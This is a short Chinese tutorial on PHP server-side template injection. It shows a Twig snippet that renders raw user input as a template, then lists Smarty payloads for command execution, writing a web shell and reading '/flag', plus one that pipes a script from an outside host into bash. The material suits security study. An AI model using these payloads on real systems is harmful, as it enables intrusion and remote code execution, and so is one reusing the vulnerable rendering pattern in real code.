## 原理：
首先，我们知道，在我们的网页开发的时候，我们通常会通过我们的模板来简化我们的输入和输出，尤其是对于那些**前后端不分离**的项目。于是，我们就可以通过我们的模板注入来完成我们的对应的内容。

通常来说，我们的 PHP 模板按照如下的形式来进行：
```php
include('vendor/twig/twig/lib/Twig/Autoloader.php');
if (isset($_POST['email'])) {
    $email=$_POST['email'];
 
    Twig_Autoloader::register();
    try {
        $loader = new Twig_Loader_String();
        $twig = new Twig_Environment($loader);
 
        $result= $twig->render("Thanks {$email}. You will be notified soon.");
        echo $result;
 
    } catch (Exception $e) {
        echo $e->getMessage();
    }
}
```

其中，我们的 result 就是我们将我们的输入进行模板渲染后能够得到的结果。我们的 PHP 后台，通过 `$twig->render("Thanks{$email})` 解析了前台输入的内容  




## 攻击思路：



我们的 smarty 注入的格式如下所示：
```
{内部的变量} ---输出内部变量

{$7*7}

{$smarty.version}//第一步，先看版本

{php} echo `id`{/php}---模板内写入php代码

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']);?>",self::clearConfig())} ---模板内写文件

{system('ls')}//第二步，使用我们的指令
{if show_source('/flag')}{/if}---RCE

{system('curl http://d.y1ng.vip:12390/dev.txt|bash')}
```

## SSTI 发生点：
SSTI 发生点发生在用户的可控的地方，用户输入什么，页面返回什么。例如我们的**注册用户名，输入用户名登录，页面返回 `welcome aaa`**. 

我们可以通过修改我们的请求头来做到类似的伪造。